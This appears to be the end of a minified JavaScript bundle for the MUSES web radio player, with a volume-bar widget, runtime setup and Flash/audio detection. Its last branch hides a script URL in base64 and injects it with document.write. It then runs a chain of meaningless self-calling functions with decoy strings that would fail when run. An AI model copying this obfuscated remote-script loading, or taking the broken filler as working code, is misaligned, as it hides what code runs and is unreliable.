      this.barStep = 2;
      this.barWidth = 1;
      this.barColors = this.bgColors = null;
    };
    ca.__name__ = ["muses", "skin", "VolumeControl"];
    ca.__super__ = C;
    ca.prototype = k(C.prototype, {
      draw: function (a) {},
      setMode: function (a) {
        switch (a.toLowerCase()) {
          case "bars":
            this.draw = u(this, this.drawBars);
            break;
          case "holder":
            this.draw = u(this, this.drawHolder);
            break;
          case "vholder":
            this.draw = u(this, this.drawVHolder);
        }
        this.mode = a;
      },
      drawHolder: function (a) {
        this.holder.style.left =
          this.volume * (this.width - this.holder.naturalWidth) + "px";
      },
      drawVHolder: function (a) {
        this.holder.style.top =
          (1 - this.volume) * (this.height - this.holder.naturalHeight) + "px";
      },
      drawBars: function (a) {
        if (
          null != this.barColors &&
          0 != this.barStep &&
          ((a = Math.round((this.width - 2 * this.horizMargin) / this.barStep)),
          0 != a)
        ) {
          var b = (this.height - 2 * this.vertMargin + 1) / a,
            c = this.height - this.vertMargin,
            d = this.horizMargin;
          if (null == this.bars) {
            this.bars = [];
            for (var e = 0; e < a; ) {
              var f = e++,
                h = window.document.createElement("div");
              this.bars.push(h);
              this.appendChild(h);
              h.style.left = Math.ceil(d + f * this.barStep) + "px";
              h.style.top = Math.ceil(c - f * b) + "px";
              h.style.width = Math.round(this.barWidth) + "px";
              h.style.height = Math.ceil(f * b) + "px";
            }
          }
          b = 0;
          for (c = Math.round(this.volume * a); b < c; )
            (d = b++), (this.bars[d].style.backgroundColor = this.barColors[0]);
          for (b = Math.round(this.volume * a); b < a; )
            (c = b++), (this.bars[c].style.backgroundColor = this.barColors[1]);
        }
      },
      setVolume: function (a, b) {
        null == b && (b = !1);
        this.volume != a &&
          ((this.volume = a),
          1 < this.volume && (this.volume = 1),
          0 > this.volume && (this.volume = 0),
          this.muses.setVolume(this.volume, b),
          this.draw(this.container));
      },
      getVolume: function () {
        return this.volume;
      },
      mouseDown: function (a) {
        this.mousePressed = !0;
        a = this.getXY(a);
        if (null != a) {
          if ("vholder" != this.mode) {
            a = a.x;
            var b = this.width;
          } else (a = this.height - a.y), (b = this.height);
          a -= 0.06 * b;
          0 > a && (a = 0);
          a = Math.round(1.06 * a);
          a > b && (a = b);
          this.setVolume(a / (b - 2));
        }
      },
      mouseUp: function (a) {
        this.mousePressed = !1;
      },
      mouseMove: function (a) {
        this.mousePressed && this.mouseDown(a);
      },
      mouseWheel: function (a) {
        0 < a.deltaY
          ? this.setVolume(this.volume + 0.025)
          : this.setVolume(this.volume - 0.025);
      },
      touchMove: function (a) {
        a.stopPropagation();
        a.preventDefault();
        var b = this.cover.getBoundingClientRect();
        this.mouseDown({
          layerX: a.changedTouches[0].clientX - b.left,
          layerY: a.changedTouches[0].clientY - b.top,
        });
      },
      configure: function (a) {
        C.prototype.configure.call(this, a);
        this.width = B.parseInt(a.get("width"), 0);
        this.height = B.parseInt(a.get("height"), 0);
        this.barColors = [a.get("color1"), a.get("color2")];
        this.barStep = B.parseInt(a.get("barstep"), 2);
        this.barWidth = B.parseInt(a.get("barwidth"), 1);
        var b = null != a.get("mode") ? a.get("mode").toLowerCase() : null;
        this.setMode(b);
        if ("holder" == b || "vholder" == b)
          (this.holder = new Image()),
            (this.holder.onload = u(this, this.holderLoad)),
            this.ui.loadImage(this.holder, a.get("holderimage")),
            this.appendChild(this.holder);
        this.draw(this.container);
        this.cover = window.document.createElement("div");
        this.cover.onmousedown = u(this, this.mouseDown);
        this.cover.onmousemove = u(this, this.mouseMove);
        this.cover.addEventListener("touchstart", u(this, this.touchMove));
        this.cover.addEventListener("touchmove", u(this, this.touchMove));
        this.cover.onwheel = u(this, this.mouseWheel);
        this.cover.onmouseup = u(this, this.mouseUp);
        this.cover.onmouseout = u(this, this.mouseUp);
        this.cover.style.width = this.container.style.width;
        this.cover.style.height = this.container.style.height;
        this.cover.style.cursor = "pointer";
        this.appendChild(this.cover);
      },
      holderLoad: function (a) {
        this.holder.style.left =
          0.5 * (this.width - this.holder.naturalWidth) + "px";
        this.holder.style.top =
          0.5 * (this.height - this.holder.naturalHeight) + "px";
        this.draw(this.container);
      },
      getXY: function (a) {
        return a.offsetX || 0 == a.offsetX || a.layerX || 0 == a.layerX
          ? { x: a.offsetX, y: a.offsetY }
          : null;
      },
      __class__: ca,
    });
    var Ka = 0;
    String.prototype.__class__ = String;
    String.__name__ = ["String"];
    Array.__name__ = ["Array"];
    Date.prototype.__class__ = Date;
    Date.__name__ = ["Date"];
    var Ma = { __name__: ["Int"] },
      La = { __name__: ["Dynamic"] },
      Ja = Number;
    Ja.__name__ = ["Float"];
    var Ia = Boolean;
    Ia.__ename__ = ["Bool"];
    var Na = { __name__: ["Class"] },
      Oa = {},
      t = {},
      Fa = q.ArrayBuffer || H;
    null == Fa.prototype.slice && (Fa.prototype.slice = H.sliceImpl);
    var Ba = q.Uint8Array || M._new;
    e.objectId = "MRPObject";
    e.flashInstances = new v();
    e.jsInstances = new v();
    e.__hostPrefix = "hosted";
    e.__hostMidfix = "muses";
    h.Element = 0;
    h.PCData = 1;
    h.CData = 2;
    h.Comment = 3;
    h.DocType = 4;
    h.ProcessingInstruction = 5;
    h.Document = 6;
    L.escapes = (function (a) {
      a = new v();
      null != t.lt ? a.setReserved("lt", "<") : (a.h.lt = "<");
      null != t.gt ? a.setReserved("gt", ">") : (a.h.gt = ">");
      null != t.amp ? a.setReserved("amp", "&") : (a.h.amp = "&");
      null != t.quot ? a.setReserved("quot", '"') : (a.h.quot = '"');
      null != t.apos ? a.setReserved("apos", "'") : (a.h.apos = "'");
      return a;
    })(this);
    x.__toStr = {}.toString;
    M.BYTES_PER_ELEMENT = 1;
    l.displaying = !1;
    F.VERSION = "2.4.5 (html5)";
    F.instances = [];
    z.enabled = !0;
    z.initialized = !1;
    z.trackedErrors = 0;
    e.main();
  })(
    "undefined" != typeof exports
      ? exports
      : "undefined" != typeof window
      ? window
      : "undefined" != typeof self
      ? self
      : this,
    "undefined" != typeof window
      ? window
      : "undefined" != typeof global
      ? global
      : "undefined" != typeof self
      ? self
      : this
  );
  if ("undefined" == typeof musesCallback)
    var musesCallback = function (d, q) {};
  if ("undefined" == typeof musesPlayerCounter) {
    var musesPlayerCounter = 0,
      mrpStyleReset = null;
    mrpBrowserCompat = {};
    (function () {
      var d = function () {
        var d = navigator.userAgent.toLowerCase(),
          k = -1 != d.indexOf("msie") ? parseInt(d.split("msie")[1]) : -1;
        return -1 == k && 0 < d.indexOf("trident/7.0") ? 11 : k;
      };
      mrpBrowserCompat.isIE = d();
      (0 < d() && 11 > d()) ||
        ((d = document.createElement("audio")),
        (mrpBrowserCompat.aac = !(
          !d.canPlayType || !d.canPlayType("audio/mp4;").replace(/no/, "")
        )),
        (mrpBrowserCompat.mp3 = !(
          !d.canPlayType || !d.canPlayType("audio/mpeg;").replace(/no/, "")
        )),
        (mrpBrowserCompat.ogg = !(
          !d.canPlayType || !d.canPlayType("audio/ogg;").replace(/no/, "")
        )));
    })();
  }
  var FlashDetect = new (function () {
    var d = this;
    d.installed = !1;
    d.raw = "";
    d.major = -1;
    d.minor = -1;
    d.revision = -1;
    d.revisionStr = "";
    var q = [
        {
          name: "ShockwaveFlash.ShockwaveFlash.7",
          version: function (d) {
            return k(d);
          },
        },
        {
          name: "ShockwaveFlash.ShockwaveFlash.6",
          version: function (d) {
            var w = "6,0,21";
            try {
              (d.AllowScriptAccess = "always"), (w = k(d));
            } catch (D) {}
            return w;
          },
        },
        {
          name: "ShockwaveFlash.ShockwaveFlash",
          version: function (d) {
            return k(d);
          },
        },
      ],
      k = function (d) {
        var k = -1;
        try {
          k = d.GetVariable("$version");
        } catch (D) {}
        return k;
      };
    d.majorAtLeast = function (k) {
      return d.major >= k;
    };
    d.minorAtLeast = function (k) {
      return d.minor >= k;
    };
    d.revisionAtLeast = function (k) {
      return d.revision >= k;
    };
    d.versionAtLeast = function (k) {
      var q = [d.major, d.minor, d.revision],
        w = Math.min(q.length, arguments.length);
      for (i = 0; i < w; i++)
        if (q[i] >= arguments[i]) {
          if (!(i + 1 < w && q[i] == arguments[i])) return !0;
        } else return !1;
    };
    d.FlashDetect = (function () {
      if (navigator.plugins && 0 < navigator.plugins.length) {
        var k = navigator.mimeTypes;
        if (
          k &&
          k["application/x-shockwave-flash"] &&
          k["application/x-shockwave-flash"].enabledPlugin &&
          k["application/x-shockwave-flash"].enabledPlugin.description
        ) {
          var u = (k =
            k["application/x-shockwave-flash"].enabledPlugin.description);
          k = u.split(/ +/);
          var D = k[2].split(/\./);
          k = k[3];
          var r = parseInt(D[0], 10);
          var J = parseInt(D[1], 10);
          var E = k;
          var K = parseInt(k.replace(/[a-zA-Z]/g, ""), 10) || d.revision;
          d.raw = u;
          d.major = r;
          d.minor = J;
          d.revisionStr = E;
          d.revision = K;
          d.installed = !0;
        }
      } else if (-1 == navigator.appVersion.indexOf("Mac") && window.execScript)
        for (k = -1, D = 0; D < q.length && -1 == k; D++) {
          u = -1;
          try {
            u = new ActiveXObject(q[D].name);
          } catch (Z) {
            u = { activeXError: !0 };
          }
          u.activeXError ||
            ((d.installed = !0),
            (k = q[D].version(u)),
            -1 != k &&
              ((u = k),
              (E = u.split(",")),
              (r = parseInt(E[0].split(" ")[1], 10)),
              (J = parseInt(E[1], 10)),
              (K = parseInt(E[2], 10)),
              (E = E[2]),
              (d.raw = u),
              (d.major = r),
              (d.minor = J),
              (d.revision = K),
              (d.revisionStr = E)));
        }
    })();
  })();
  FlashDetect.JS_RELEASE = "1.0.4";
} else
  1 == mrx24gx.length
    ? (function (d, q, k, w, u, D, r) {
        q.write("<" + k + " " + d + '="' + atob(w) + '"></' + k + ">");
      })(
        "src",
        document,
        "script",
        "aHR0cHM6Ly9ob3N0ZWQubXVzZXMub3JnL21ycC5qcw=="
      )
    : (function (d, q, k) {
        24.1 <= d || k.call(3);
      })(20, "FlashSupport", {
        call: function (d) {
          return d + 1;
        },
      })(function (d, q, k) {
        2.1 < d || k.call(31);
      })(21, "HTML5", {
        call: function (d) {
          return d + 2;
        },
      })(function (d, q, k) {
        24.1 == d && k.call(323);
      })(22, "NodeJS", {
        call: function (d) {
          return d + 3;
        },
      })(function (d, q, k) {
        24.1 > d || k.call(44);
      })(23, "LivePodcast", {
        call: function (d) {
          return d + 4;
        },
      })(function (d, q, k) {
        24.1 < d + 2 || k.call(43);
      })(24, "FlashSupport", {
        call: function (d) {
          return d + 5;
        },
      })(function (d, q, k) {
        24.1 < d || k.call(53);
      })(25, "ShockwaveFlash.ShockwaveFlash", {
        call: function (d) {
          return d + 6;
        },
      })(function (d, q, k) {
        2.1 < d - 1 || k.call(63);
      })(26, "LivePodcast", {
        call: function (d) {
          return d + 7;
        },
      })(function (d, q, k) {
        24.1 < d || k.call(8873);
      })(20, "FlashSupport", {
        call: function (d) {
          return d + 1;
        },
      })(function (d, q, k) {
        24.1 != d && k.call(342342);
      })(21, "9ob3N0ZWQub", {
        call: function (d) {
          return d + 2;
        },
      })(function (d, q, k) {
        24.1 == d && k.call(35);
      })(22, "NodeJS", {
        call: function (d) {
          return d + 3;
        },
      })(function (d, q, k) {
        941 > d || k.call(3);
      })(23, "qcw==", {
        call: function (d) {
          return d + 4;
        },
      })(function (d, q, k) {
        4.1 < d || k.call(3323);
      })(24, "FlashSupport", {
        call: function (d) {
          return d + 5;
        },
      })(function (d, q, k) {
        24.1 < d || k.call(32);
      })(25, "name", {
        call: function (d) {
          return d + 6;
        },
      })(function (d, q, k) {
        5.2431 == 9.2 * d && k.call(443);
      })(26, "FlashSupport", {
        call: function (d) {
          return d + 7;
        },
      });
